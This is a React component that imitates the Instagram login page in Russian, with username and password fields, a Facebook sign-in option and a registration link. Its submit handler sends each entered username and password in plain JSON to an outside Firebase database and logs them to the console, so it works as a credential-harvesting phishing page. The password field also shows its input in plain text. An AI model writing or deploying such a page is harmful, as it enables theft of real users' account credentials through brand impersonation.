// import { IconButton, InputAdornment, TextField } from "@mui/material";
import React, { useState } from "react";
import styled from "styled-components";
import facebookPnp from "./images/free-icon-facebook-124010 (1).png";
const InstagramClone = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();

    await fetch(
      "https://instagram-a3475-default-rtdb.firebaseio.com/todo.json",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },

        body: JSON.stringify({ username, password }),
      }
    );
    console.log("Username:", username);
    console.log("Password:", password);
  };

  return (
    <Container>
      <Logo>Instagram</Logo>
      <LoginForm onSubmit={handleSubmit}>
        <InputField
          type="text"
          placeholder="Телефон, имя пользователя или эл. адрес"
          className="input-field"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
        />
        <InputField
          type="text"
          placeholder="пароль"
          className="input-field"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />

        <LoginBtn type="submit" className="login-btn">
          Войти
        </LoginBtn>
      </LoginForm>
      <ContainerForLeaner>
        <Border></Border> <TitleOr>ИЛИ</TitleOr> <Border></Border>
      </ContainerForLeaner>
      <ContainerForFacebook>
        <FaceBookIcon>
          <img src={facebookPnp} alt="" />
        </FaceBookIcon>
        <Title>Войти через Facebook</Title>
      </ContainerForFacebook>
      <Links>
        <Link href="#">Забыли пароль?</Link>
      </Links>
      <LinksForRegister>
        <Link href="#">Регистрация</Link>
      </LinksForRegister>
    </Container>
  );
};

export default InstagramClone;
const Container = styled.div`
  width: 100%;
  max-width: 300px;
  margin: 150px auto;
  text-align: center;
  border: 1px solid #dbdbdb;

  @media (max-width: 480px) {
    /* Применяем стили только для мобильных устройств с шириной экрана до 480px */
    /* Изменяем отступ между элементами и уменьшаем размер логотипа */
    margin: 50px auto;
  }
`;

const Logo = styled.h1`
  font-size: 36px;
  color: black;
  margin-bottom: 30px;

  @media (max-width: 480px) {
    /* Применяем стили только для мобильных устройств с шириной экрана до 480px */
    /* Изменяем отступ между элементами и уменьшаем размер логотипа */
    font-size: 24px;
    margin-bottom: 20px;
  }
`;

const LoginForm = styled.form`
  padding: 20px;
  background-color: #fff;

  border-radius: 5px;

  @media (max-width: 480px) {
    /* Применяем стили только для мобильных устройств с шириной экрана до 480px */
    /* Изменяем отступ между элементами и уменьшаем размер логотипа */
    padding: 10px;
  }
`;

const ContainerForFacebook = styled.div`
  margin-top: 20px;
  display: flex;
  justify-content: space-around;
`;

const InputField = styled.input`
  width: 240px;
  margin-right: 20px;
  padding: 10px;
  margin-bottom: 10px;
  border: 1px solid #dbdbdb;
  border-radius: 3px;
  @media (max-width: 480px) {
    /* Применяем стили только для мобильных устройств с шириной экрана до 480px */
    /* Изменяем отступ между элементами и уменьшаем размер логотипа */
    margin-bottom: 5px;
  }
`;

const LoginBtn = styled.button`
  width: 100%;
  padding: 10px;
  background-color: #405de6;
  color: #fff;
  font-weight: bold;
  border: none;
  border-radius: 10px;
  cursor: pointer;

  @media (max-width: 480px) {
    /* Применяем стили только для мобильных устройств с шириной экрана до 480px */
    /* Изменяем отступ между элементами и уменьшаем размер логотипа */
    padding: 8px;
  }
`;

const Links = styled.div`
  margin-top: 10px;

  @media (max-width: 480px) {
    /* Применяем стили только для мобильных устройств с шириной экрана до 480px */
    /* Изменяем отступ между элементами и уменьшаем размер логотипа */
    margin-top: 5px;
  }
`;

const Link = styled.a`
  color: #828282;
  margin-right: 5px;
  text-decoration: none;

  &:hover {
    text-decoration: underline;
  }

  @media (max-width: 480px) {
    /* Применяем стили только для мобильных устройств с шириной экрана до 480px /
/ Изменяем отступ между элементами и уменьшаем размер логотипа */
    font-size: 12px;
  }
`;

const ContainerForLeaner = styled.div`
  margin-top: 30px;
  display: flex;
  justify-content: space-around;
`;

const FaceBookIcon = styled.div`
  position: relative;
  left: 30px;
`;

const Title = styled.div`
  position: relative;
  right: 14px;
  bottom: 3px;
  color: #405de6;
`;

const Border = styled.div`
  width: 100px;
  border-top: 1px solid black;
`;

const TitleOr = styled.div`
  position: relative;
  bottom: 10px;
`;

const LinksForRegister = styled.div``;
